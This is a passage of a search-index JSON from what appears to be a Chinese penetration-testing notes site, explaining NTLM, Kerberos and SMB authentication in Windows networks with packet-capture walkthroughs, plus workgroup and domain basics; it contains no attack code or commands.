NTLM\u4e5f\u662f\u4e00\u4e2a\u8ba4\u8bc1\u534f\u8bae\uff0c\u4e0eKerberos\u534f\u8bae\u529f\u80fd\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7NTLM\u7684\u5b89\u5168\u6027\u53ef\u6ca1\u6709Kerberos\u597d \u9a8c\u8bc1\u673a\u5236 NTLM\u534f\u8bae\u9a8c\u8bc1\u673a\u5236\u662f\u57fa\u4e8e \u6311\u6218(chanllage)/\u56de\u5e94(response) \u6a21\u5f0f\u7684 \u5b83\u7684\u9a8c\u8bc1\u6a21\u5f0f\u5927\u81f4\u5982\u4e0b: \u7528\u6237\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\uff0c\u672c\u5730\u628a\u5bc6\u7801\u52a0\u5bc6\u4e3a\u4e00\u4e2ahash\u503c\uff0c\u79f0\u4e3a NTML-Hash \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u7528\u6237\u540d \uff08\u8fd9\u4e2a\u6570\u636e\u79f0\u4e3a TYPE 1 Negotiate \uff09 \u670d\u52a1\u7aef\u63a5\u6536\u8bf7\u6c42\uff0c\u5224\u65ad\u6570\u636e\u5e93\u4e2d\u8be5\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u751f\u6210\u4e00\u4e2a16\u4f4d\u968f\u673a\u6570\u79f0\u4e4b\u4e3achanllage\u3002\u540c\u65f6\u5c06chanllage\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef \uff08 TYPE 2 \uff09 \u5ba2\u6237\u7aef\u6536\u5230chanllage\u540e\u5c06\u5176\u7528\u4e0a\u9762\u751f\u6210\u7684hash\u503c\u6765\u52a0\u5bc6\u8fd9\u4e2achanllange\uff0c\u5e76\u4e0e\u7528\u6237\u540d\uff0cchanllange\u7b49\u7ec4\u5408\u5230\u4e00\u8d77\u5f97\u5230 Net-NTLMHash \u6700\u540e\u5c06 Net-NTLMHash \u5c01\u88c5\u5230 TYPE 3 NTLM_AUTH \u6d88\u606f\u4e2d\u53d1\u5f80\u670d\u52a1\u5668\u3002 \u670d\u52a1\u5668\u6536\u5230TYPE3\u540e\uff0c\u7528\u81ea\u5df1\u6570\u636e\u5e93\u4e2d\u8be5\u7528\u6237\u7684\u5bc6\u7801\u7684NTML-Hash\u52a0\u5bc6chanllage\uff0c\u5e76\u6bd4\u8f83\u81ea\u5df1\u8ba1\u7b97\u51fa\u7684 Net-NTLMHash \u4e0e\u5ba2\u6237\u7aef\u53d1\u8fc7\u6765\u7684 Net-NTLMHash \uff0c\u82e5\u76f8\u540c\u5219\u8ba4\u8bc1\u6210\u529f \uff08\u4ee5\u4e0a\u662f\u5ba2\u6237\u7aef-\u670d\u52a1\u7aef\u6a21\u578b\uff0c\u82e5\u662f\u5728\u57df\u4e2d\uff0c\u9a8c\u8bc1\u6b65\u9aa4\u5c31\u4f1a\u6709\u70b9\u4e0d\u540c\uff09 \u82e5\u5728\u57df\u4e2d\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u5728\u7b2c5\u6b65\u6536\u5230TYPE3\u540e\u4e0d\u4f1a\u81ea\u884c\u8fdb\u884c\u6bd4\u5bf9\uff0c\u800c\u662f\u5c06 Net NTLM-Hash \u8f6c\u53d1\u7ed9\u57df\u63a7\u5236\u5668DC\uff0c\u7531DC\u8fdb\u884c\u6700\u540e\u7684 Net NTLM-Hash \u6bd4\u8f83\u8ba4\u8bc1 Kerberos\u534f\u8bae Kerberos\u534f\u8bae\uff0c\u662f\u4e00\u4e2a\u5e38\u7528\u7684\u8ba4\u8bc1\u4e0e\u6388\u6743\u534f\u8bae(\u4e0b\u9762\u53ea\u662f\u7b80\u5316\u8fc7\u7684\u5927\u81f4\u6d41\u7a0b\uff0c\u5177\u4f53\u6d41\u7a0b\u8bf7\u770b\u4e0b\u9762\u7684wireshark\u6293\u5305\u5206\u6790) \u6574\u4f53\u6d41\u7a0b \u53c2\u4e0e\u7684\u5173\u952e\u89d2\u8272 Client : Application Client \u5e94\u7528\u5ba2\u6237\u7aef AS : Authentication Server \u7528\u6765\u8ba4\u8bc1\u7528\u6237\u8eab\u4efd TGS : Ticket-Granting Service \u7528\u6765\u6388\u6743\u670d\u52a1\u8bbf\u95ee SS : Service Server \u7528\u6237\u6240\u8bf7\u6c42\u7684\u670d\u52a1 \u5176\u4e2dAS\u548cTGS\u90fd\u5c5e\u4e8eKDC\u7cfb\u7edf\uff08 \u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3 \uff09 Kerberos\u8ba4\u8bc1\u8be6\u89e3\uff1a \u4ee5\u4e0b\u7684\u52a0\u5bc6\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6 1.\u7528\u6237\u767b\u5f55 \u7528\u6237\u5148\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u5176\u4e2d\u5bc6\u7801\u5728\u8fd9\u4e2a\u9636\u6bb5\u4f1a\u88ab\u5355\u5411hash\u51fd\u6570\u52a0\u5bc6\u4e3a\u4e00\u4e2a\u5bc6\u94a5\uff0c\u7528\u6765\u89e3\u5bc6\u540e\u9762\u7684\u4fe1\u606f 2.\u8bf7\u6c42\u8eab\u4efd\u8ba4\u8bc1\uff08client\u548ckdc\u53cc\u5411\u8ba4\u8bc1\uff09 2.1 \u5ba2\u6237\u7aef\u5411AS\u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42 \u5ba2\u6237\u7aef\u5411as\u53d1\u9001\u7528\u6237\u540d\u4fe1\u606f\uff08\u660e\u6587\uff09\uff08\u8fdb\u53d1\u9001\u7528\u6237\u540d\u800c\u6ca1\u6709\u53d1\u9001\u5bc6\u7801\uff09 2.2AS\u786e\u8ba4\u5ba2\u6237\u7aef\u8eab\u4efd AS\u5148\u628a\u7528\u6237\u540d\u5728\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u4e00\u4e0b\uff0c\u5982\u679c\u8be5\u7528\u6237\u540d\u5b58\u5728\u5219\u627e\u5230\u8be5\u7528\u6237\u7684\u5bc6\u7801\u4f7f\u7528\u5355\u5411hash\u51fd\u6570\u751f\u6210client\u5bc6\u94a5\u5e76\u8fd4\u56deMsg A\u548cB\u3002 A\u4e2d\u7684\u5185\u5bb9\u662f\u4e00\u4e2a\u88abClient\u5bc6\u94a5\u52a0\u5bc6\u7684\u7528\u4e8e\u751f\u6210Authenticator1\u7684\u6570\u636e B\u4e2d\u7684\u5185\u5bb9\u662f\u4e00\u4e2a\u88abTGS\u5bc6\u94a5\u52a0\u5bc6\u7684\u4e00\u5806\u4fe1\u606f\u53eb\u505a TGT \uff0c\u5f53\u524d\u65e0TGS\u5bc6\u94a5\u6545\u65e0\u6cd5\u89e3\u5f00\uff0c\u5176\u4e2d\u5305\u542b \u5ba2\u6237\u7aefID\uff0c\u6709\u6548\u671f \uff0cClient\u7f51\u7edc\u5730\u5740\u4ee5\u53caMSG A\u89e3\u5bc6\u540e\u7684\u5185\u5bb9 3. \u8bf7\u6c42\u670d\u52a1\u6388\u6743\uff08client\u8bf7\u6c42kdc\u8ba4\u8bc1server\uff09 3.1 \u5ba2\u6237\u7aef\u5411TGS\u53d1\u9001\u8bf7\u6c42\u670d\u52a1\u6388\u6743\u8bf7\u6c42 Client\u5728MSG C\u5411TGS\u53d1\u9001 \u8bf7\u6c42\u7684\u670d\u52a1\u7684ID\uff0c2.2\u4e2d\u7684TGT\uff0cMSG D \u53d1\u9001\u7531 [Client/TGS SessionKey] \u52a0\u5bc6\u7684Authenticator 1 {Client ID, Timestamp}\u3002 3.2 TGS\u4e3aClient\u54cd\u5e94\u670d\u52a1\u6388\u6743\u7968\u636e Msg E \u4f7f\u7528 [Service\u5bc6\u94a5] \u52a0\u5bc6\u7684Client-To-Server Ticket, \u8be5Ticket\u4e2d\u5305\u542b\u4e86\u5982\u4e0b\u4fe1\u606f: [Client/Server SessionKey] Client\u7f51\u7edc\u5730\u5740 Ticket\u6709\u6548\u65f6\u95f4 Client ID Msg F \u4f7f\u7528 **[Client/TGS SessionKey] \u52a0\u5bc6\u7684 [Client/Server SessionKey] **\u3002 4. \u53d1\u9001\u670d\u52a1\u8bf7\u6c42\uff08client\u4e0ess\u53cc\u5411\u8ba4\u8bc1\uff09 4.1 Client\u5411SS(Service Server)\u53d1\u9001\u670d\u52a1\u8bf7\u6c42 \u53d1\u9001\u7684\u6d88\u606f\u4e2d\u5305\u62ec\uff1a Msg E \u4e0a\u4e00\u6b653.2\u4e2d\uff0cTGS\u4e3aClient\u54cd\u5e94\u7684\u6d88\u606fMsg E\u3002\u8be5\u6d88\u606f\u53ef\u4ee5\u7406\u89e3\u4e3a\u7531Client\u4e3aSS\u643a\u5e26\u7684\u6d88\u606f\u3002 Msg G \u7531 **[Client/Server SessionKey] \u52a0\u5bc6\u7684 Authenticator 2 **\uff0c\u5305\u542b{Client ID, Timestamp}\u4fe1\u606f\u3002 \u8fd9\u91cc\u7684Authenticator 2\u533a\u522b\u4e8e\u524d\u97623.1\u6b65\u9aa4\u4e2d\u7684Authenticator 1\u3002 Note **[Client/Server SessionKey] \u5e76\u672a\u76f4\u63a5\u900f\u660e\u4f20\u8f93\uff0c\u800c\u662f\u88ab\u5305\u542b\u5728\u4f7f\u7528 [Service\u5bc6\u94a5]**\u52a0\u5bc6\u7684Msg E\u4e2d\u3002 \u65e2\u7136 **[Client/Server SessionKey] \u5e76\u4e0d\u76f4\u63a5\u900f\u660e\u4f20\u8f93\uff0c Client\u9700\u8981\u5411SS\u8bc1\u660e\u81ea\u5df1\u62e5\u6709\u6b63\u786e\u7684 [Client/Server SessionKey] \uff0c\u6240\u4ee5\uff0cAuthenticator 2\u4f7f\u7528\u4e86 [Client/Server SessionKey]**\u52a0\u5bc6\u3002 4.2 SS\u54cd\u5e94Client Kerberos\u6293\u5305\u5206\u6790 \u4ee5\u4e0a\u662fkerberos\u534f\u8bae\u7b80\u5316\u56fe ASREQ \u5373\u5ba2\u6237\u7aef\u5f80\u670d\u52a1\u7aef\u7684\u7b2c\u4e00\u6b21\u901a\u8baf \u6211\u6293\u5230\u7684\u5305\u7684\u6837\u5b50,\u6211\u4eec\u6765\u89e3\u8bfb\u4e00\u4e0b 1.pvno: \u6807\u8bb0\u7740kerberos\u534f\u8bae\u7684\u7248\u672c 2.msg-type: \u6807\u8bb0\u7740\u8fd9\u4e2a\u5305\u7684\u7c7b\u578b\uff0c ASREQ\u5bf9\u5e94\u7684\u5c31\u662fKRBAS_REQ(0x0a) 3.padata:\u7528\u4e8e\u5b58\u50a8\u4e00\u4e9b\u8ba4\u8bc1\u4fe1\u606f \u5176\u5b9e\u8fd9\u4e2a\u5934\u4e0b\u9762\u8fd8\u6709\u5f88\u591a\u4e0d\u540c\u7684\u7c7b\u578b\u7684\u5934\uff0c\u4f46\u662f\u8fd9\u91cc\u6293\u5230\u4e86PA-DATA PA-ENC-TIMESTAMP\u548cPA-DATA PA-PAC-REQUEST\u8fd9\u4e24\u4e2a\u5934\u90e8\uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u5934\u90e8\u662fpadata\u6700\u5e38\u7528\u6700\u6838\u5fc3\u7684\u5934\u90e8. PA-DATA PA-ENC-TIMESTAMP : \u5c31\u662f\u7528\u6237hash\u52a0\u5bc6\u7684\u65f6\u95f4\u6233,\u4f5c\u7528\u5728\u4e8e:as\u914d\u5408\u7528\u6237\u7684\u660e\u6587\u8d26\u6237(cname\u5934)\u5728\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u53d6\u7528\u5176hash\u6765\u89e3\u5bc6\u8fd9\u4e2a\u65f6\u95f4\u6233\uff0c\u82e5\u63ed\u79d8\u6210\u529f\u5219\u8ba4\u8bc1\u901a\u8fc7 PA-DATA PA-ENC-TIMESTAMP: \u8fd9\u4e2a\u662f\u542f\u7528PAC(\u4e00\u4e2a\u63a7\u5236\u7528\u6237\u6743\u9650\u7684\u4e1c\u897f)\u652f\u6301\u7684\u6269\u5c55\u3002 4.req-body:\u8bf7\u6c42\u4e3b\u4f53\uff0c\u4e5f\u5305\u542b\u4e86\u8bb8\u591a\u4fe1\u606f.\u8fd9\u4e2a\u5934\u91cc\u9762\u6bd4\u8f83\u91cd\u8981\u7684\u4e1c\u897f\u662f cname:\u5b58\u50a8\u7740\u53d1\u9001\u8bf7\u6c42\u7684\u7528\u6237\u540d\uff08\u660e\u6587\u7528\u6237\u540d\uff09 sname:\u8fd9\u4e2a\u5305\u542b\u7684\u662f\u670d\u52a1\u7aef\u7684\u8eab\u4efd, \u5728ASREQ\u91cc\u9762\u662fkrbtgt \uff0c\u8fd8\u6709\u6240\u5728\u57df\u540d\u79f0\u3002till\u4e3a\u5230\u671f\u65f6\u95f4\uff0cnonce\u4e3a\u968f\u673a\u751f\u6210\u6570 realm:\u6240\u5728\u57df\u540d\u79f0 etype:\u544a\u77e5\u670d\u52a1\u5668\uff0c\u8fd9\u4e2ahash\u7684\u52a0\u5bc6\u65b9\u5f0f \u4e4b\u524d\u4e00\u76f4\u56f0\u6270\u6211\u7684 \u201c\u4e3a\u4ec0\u4e48\u6709\u4e9b\u6587\u7ae0\u8bf4\u7684\u7b2c\u4e00\u6b65\u662f\u5411\u670d\u52a1\u5668\u53d1\u9001\u660e\u6587\u8d26\u6237\u540d\uff0c\u6709\u4e9b\u6587\u7ae0\u662f\u5411\u670d\u52a1\u5668\u53d1\u9001\u65f6\u95f4\u6233hash\u201d\u95ee\u9898\u6293\u4e86\u4e00\u4e0b\u5305\u5c31\u61c2\u4e86.. ASREP 1.ticket:\u8fd9\u4e2a\u5c31\u662fTGT\u4e86\u3002 tkt-vno:\u7968\u636e\u683c\u5f0f\u7248\u672c\u53f7 realm:\u6240\u5728\u57df\u540d sname:\u540casres enc-part:\u88abkrbtgt\u5bc6\u94a5\u52a0\u5bc6\u7684\u7968\u636e\u672c\u4f53\u90e8\u5206 2.enc-part:\u88abclient hash \u52a0\u5bc6\u7684login session key TGSREQ 1.ap-req->\u2026->tikect: \u53ef\u4ee5\u53d1\u73b0TGSREQ\u628a\u6574\u4e2aTGT\u53d1\u9001\u7ed9\u4e86TGS 2ap-req->\u2026->authenticator:\u88ablogin session key\u52a0\u5bc6\u7684\u65f6\u95f4\u6233\u548cclient id TGSREP 1.tikect:\u8fd9\u91cc\u5c31\u662fTGS\u90e8\u5206\u4e86\u3002 enc-part\uff1a\u8fd9\u91cc\u7684enc-part\u662f\u88ab\u6240\u8bf7\u6c42\u7684\u670d\u52a1\u7684\u7528\u6237hash\u52a0\u5bc6\u7684 2.enc-part:\u88ablogin session key\u52a0\u5bc6\u7684service session key SMB\u534f\u8bae SMB\u534f\u8bae\u662f\u4e00\u4e2a\u7528\u4e8e\u4e24\u53f0\u8ba1\u7b97\u673a\u95f4\u5171\u4eab\u6587\u4ef6 \u3001\u6253\u5370\u673a\u3001\u4e32\u53e3\u7b49\u529f\u80fd\u7684\u534f\u8bae\u3002 \u7f51\u4e0a\u90bb\u5c45\u529f\u80fd\u5c31\u662f\u4f9d\u9760SMB\u534f\u8bae\u800c\u8d77\u7684\u3002 \u901a\u8fc7smb\u534f\u8bae\uff0c\u4e00\u53f0\u8ba1\u7b97\u673a\u53ef\u4ee5\u5728\u7ecf\u8fc7smb\u8ba4\u8bc1\u540e\u8bfb\u5199\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u7684\u4e00\u4e9b\u6587\u4ef6\u3002 smb\u534f\u8bae\u4e00\u822c\u67b6\u8bbe\u5728NetBios\u534f\u8bae\u4e4b\u4e0a\u3002 NetBIOS \u4f7f\u7528\u4e0b\u5217\u7aef\u53e3\uff1aUDP/137\uff08NetBIOS \u540d\u79f0\u670d\u52a1\uff09\u3001UDP/138\uff08NetBIOS \u6570\u636e\u62a5\u670d\u52a1\uff09\u3001TCP/139\uff08NetBIOS \u4f1a\u8bdd\u670d\u52a1\uff09\uff1bSMB \u4f7f\u7528\u4e0b\u5217\u7aef\u53e3\uff1aTCP/139\u3001TCP/445\u3002 SMB\u8ba4\u8bc1 \u5982\u679c\u6211\u4eec\u60f3\u4f9d\u9760smb\u534f\u8bae\u53bb\u8bfb\u5199\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u5176\u4e2d\u7684SMB\u8ba4\u8bc1\u60c5\u51b5\u662f\u5982\u4f55\u5462\uff1f\u6211\u4eec\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u3002 1.\u7248\u672c\u786e\u7acb\u9636\u6bb5 2.\u7528\u6237\u8ba4\u8bc1\u9636\u6bb5 3.\u8d44\u6e90\u94fe\u63a5\u9636\u6bb5 4.\u8d44\u6e90\u8bfb\u5199\u9636\u6bb5 \u66f4\u8be6\u7ec6\u4e00\u70b9\u3002 1.\u7248\u672c\u786e\u7acb\u9636\u6bb5\u3002\u5ba2\u6237\u7aef\u5148\u53d1\u9001\u81ea\u5df1\u652f\u6301\u7684SMB\u534f\u8bae\u7248\u672c\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6536\u5230\u540e\u5411\u5ba2\u6237\u7aef\u5217\u51fa\u5e0c\u671b\u4f7f\u7528\u7684\u7248\u672c\u3002\u82e5\u5ba2\u6237\u7aef\u652f\u6301\u7684smb\u7248\u672c\u670d\u52a1\u5668\u5747\u4e0d\u652f\u6301\uff0c\u5219\u8fd4\u56de 0XFFFFH\uff0c\u7ed3\u675f\u901a\u4fe1 \u3002 2.\u7528\u6237\u8ba4\u8bc1\u9636\u6bb5\u3002\u786e\u7acb\u597d\u8ba4\u8bc1\u7248\u672c\u540e\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\u53d1\u9001\u8d26\u6237\u5bc6\u7801\u7ed9\u670d\u52a1\u7aef\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e86\u3002\u670d\u52a1\u5668\u6536\u5230\u540e\u8fd4\u56de\u8ba4\u8bc1\u6210\u529f\u6216\u5931\u8d25 3.\u8d44\u6e90\u94fe\u63a5\u9636\u6bb5\u3002\u7528\u6237\u8ba4\u8bc1\u901a\u8fc7\u540e\uff0c\u5ba2\u6237\u7aef\u53d1\u9001\u81ea\u5df1\u60f3\u8981\u8bbf\u95ee\u7684\u8d44\u6e90\u540d\uff0c\u670d\u52a1\u5668\u6536\u5230\u540e\u8fd4\u56de\u5141\u8bb8\u6216\u62d2\u7edd 4.\u8d44\u6e90\u8bfb\u5199\u9636\u6bb5\uff0c\u5ba2\u6237\u7aef\u5f00\u59cb\u8bfb\u5199\u670d\u52a1\u5668\u4e0a\u6587\u4ef6\u3002 \u770b\u8d77\u6765\u6bd4ntlm\u548ckerberos\u7b80\u5355\u591a\u4e86\u3002\u6293\u5305\u5206\u6790\u4e00\u4e0b\u3002 \u6293\u5305\u5206\u6790 1.1 \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u7aef\u5217\u51fa\u5f53\u524d\u652f\u6301\u7684smb\u7248\u672c 1.2\u670d\u52a1\u5668\u8fd4\u56de\u5e0c\u671b\u7684SMB\u7248\u672c 1.3\u8fd9\u91cc\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u6b64\u65f6\u670d\u52a1\u5668\u53ea\u662f\u9009\u4e2d\u4e86SMB2\uff0c\u4f46\u662fSMB2\u4e5f\u5206\u4e86\u5f88\u591a\u7248\u672c\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u8fd8\u4f1a\u57fa\u4e8eSMB2\u7ee7\u7eed\u8fdb\u884c\u7248\u672c\u95ee\u8be2 \u7136\u540e\u670d\u52a1\u5668\u518d\u7ee7\u7eed\u9009\u62e9\u4e00\u4e2a\u7ec6\u5206\u7248\u672c\uff0c\u7248\u672c\u534f\u5546\u7ed3\u675f 2.1 \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u7aef\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u3002SMB\u534f\u8bae\u7684\u8fd9\u4e00\u4e2a\u90e8\u5206\u4f7f\u7528NTLM\u534f\u8bae\u5b8c\u6210\u7684\u3002\u5efa\u8bae\u5148\u770b\u770bNTLM\u8ba4\u8bc1\u518d\u8fc7\u6765 \u9996\u5148\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42NTLM\u8ba4\u8bc1\u7684\u5305 2.2\u670d\u52a1\u7aef\u8fd4\u56dechallenge 2.3 \u5ba2\u6237\u7aef\u53d1\u9001\u7528\u6237\u540d\uff0c\u88abclient hash\u52a0\u5bc6\u7684challenge\uff08NTLM RESPONSE\uff09\u7ed9\u670d\u52a1\u7aef 2.4\u670d\u52a1\u7aef\u8fdb\u884c\u8ba4\u8bc1\u5904\u7406\uff0c\u8fd4\u56de\u8ba4\u8bc1\u6210\u529f\u6216\u5931\u8d25\uff0c\u4e0b\u56fe\u662f\u6210\u529f\u65f6\uff0c\u8fd4\u56de \u4f1a\u8bdd\u5efa\u7acb\u5b57\u6837 3.1\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u7684\u8d44\u6e90 3.2\u670d\u52a1\u7aef\u8fd4\u56de\u5141\u8bb8\u6216\u62d2\u7edd \u5404\u79cd\u8bfb\u5199\u64cd\u4f5c\u8bf7\u6c42 TIPS \u4e00\u4e2a\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u540e\uff0c\u5b83\u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u5c06\u4f1a\u88ab\u7981\u7528\u3002 \u5728\u5df2\u52a0\u5165\u57df\u7684\u4e3b\u673a\u767b\u5f55\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u8f93\u5165\u6b63\u786e\u5bc6\u7801\u540e\u4f1a\u63d0\u793a\u8d26\u6237\u7981\u7528","title":"Windows\u5185\u7f51\u57fa\u7840\u6982\u89c8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#windows","text":"","title":"Windows\u5185\u7f51\u57fa\u7840\u6982\u89c8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_1","text":"\u57df\uff0c\u5de5\u4f5c\u7ec4\uff0c\u6d3b\u52a8\u76ee\u5f55 \u5de5\u4f5c\u7ec4 \u57df \u5de5\u4f5c\u7ec4\u548c\u57df\u7684\u533a\u522b \u6d3b\u52a8\u76ee\u5f55 NTLM\u534f\u8bae \u9a8c\u8bc1\u673a\u5236 Kerberos\u534f\u8bae \u6574\u4f53\u6d41\u7a0b \u53c2\u4e0e\u7684\u5173\u952e\u89d2\u8272 Kerberos\u8ba4\u8bc1\u8be6\u89e3\uff1a 1.\u7528\u6237\u767b\u5f55 2.\u8bf7\u6c42\u8eab\u4efd\u8ba4\u8bc1\uff08client\u548ckdc\u53cc\u5411\u8ba4\u8bc1\uff09 2.1 \u5ba2\u6237\u7aef\u5411AS\u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42 2.2AS\u786e\u8ba4\u5ba2\u6237\u7aef\u8eab\u4efd 3. \u8bf7\u6c42\u670d\u52a1\u6388\u6743\uff08client\u8bf7\u6c42kdc\u8ba4\u8bc1server\uff09 3.1 \u5ba2\u6237\u7aef\u5411TGS\u53d1\u9001\u8bf7\u6c42\u670d\u52a1\u6388\u6743\u8bf7\u6c42 3.2 TGS\u4e3aClient\u54cd\u5e94\u670d\u52a1\u6388\u6743\u7968\u636e 4. \u53d1\u9001\u670d\u52a1\u8bf7\u6c42\uff08client\u4e0ess\u53cc\u5411\u8ba4\u8bc1\uff09 4.1 Client\u5411SS(Service Server)\u53d1\u9001\u670d\u52a1\u8bf7\u6c42 4.2 SS\u54cd\u5e94Client Kerberos\u6293\u5305\u5206\u6790 ASREQ ASREP TGSREQ TGSREP SMB\u534f\u8bae SMB\u8ba4\u8bc1 \u6293\u5305\u5206\u6790 TIPS","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_2","text":"","title":"\u57df\uff0c\u5de5\u4f5c\u7ec4\uff0c\u6d3b\u52a8\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_3","text":"\u5de5\u4f5c\u7ec4\u53ef\u4ee5\u8ba4\u4e3a\u662f\u540c\u4e00\u7f51\u7edc\u5185\uff0c\u529f\u80fd\u76f8\u4f3c\u7684\u7535\u8111\u8fdb\u884c\u7684\u5206\u7ec4\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u201c\u5728\u4e00\u4e2a\u7f51\u7edc\u5185\uff0c\u53ef\u80fd\u6709\u6210\u767e\u4e0a\u5343\u53f0\u7535\u8111\uff0c\u5982\u679c\u8fd9\u4e9b\u7535\u8111\u4e0d\u8fdb\u884c\u5206\u7ec4\uff0c\u90fd\u5217\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u5185\uff0c\u53ef\u60f3\u800c\u77e5\u4f1a\u6709\u591a\u4e48\u4e71\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0cWindows 9x/NT/2000\u5c31\u5f15\u7528\u4e86\u201c\u5de5\u4f5c\u7ec4\u201d\u8fd9\u4e2a\u6982\u5ff5\uff0c\u5c06\u4e0d\u540c\u7684\u7535\u8111\u4e00\u822c\u6309\u529f\u80fd\u5206\u522b\u5217\u5165\u4e0d\u540c\u7684\u7ec4\u4e2d\uff0c\u5982\u8d22\u52a1\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u8d22\u52a1\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\uff0c\u4eba\u4e8b\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u4eba\u4e8b\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\u3002\u4f60\u8981\u8bbf\u95ee\u67d0\u4e2a\u90e8\u95e8\u7684\u8d44\u6e90\uff0c\u5c31\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u91cc\u627e\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u5de5\u4f5c\u7ec4\u540d\uff0c\u53cc\u51fb\u5c31\u53ef\u4ee5\u770b\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u7535\u8111\u4e86\u3002 \u201d \u8fd9\u5c31\u662f\u5de5\u4f5c\u7ec4\uff0c\u4f46\u662f\u5728\u5de5\u4f5c\u7ec4\u4e2d\u7684\u7535\u8111\u8fd8\u662f\u5404\u81ea\u7ba1\u7406\u3002\u5f53\u5176\u4e2d\u4e00\u53f0\u8ba1\u7b97\u673a\u8bbf\u95ee\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u65f6\u8fd8\u662f\u8981\u7ecf\u8fc7\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u7684\u8ba4\u8bc1\u7684","title":"\u5de5\u4f5c\u7ec4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_4","text":"\u57df\uff0c\u662f\u4e00\u7fa4\u76f8\u4e92\u4fe1\u4efb\u7684\u8ba1\u7b97\u673a\u7684\u96c6\u5408 \u60f3\u8981\u8bbf\u95ee\u57df\u4e2d\u8d44\u6e90\u5c31\u5fc5\u987b\u7ecf\u8fc7\u4e00\u53f0\u8d1f\u8d23\u6bcf\u4e00\u53f0\u8054\u5165\u7f51\u7edc\u7684\u7535\u8111\u548c\u7528\u6237\u7684\u9a8c\u8bc1\u5de5\u4f5c\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u4e2a\u670d\u52a1\u5668\u53eb\u505a 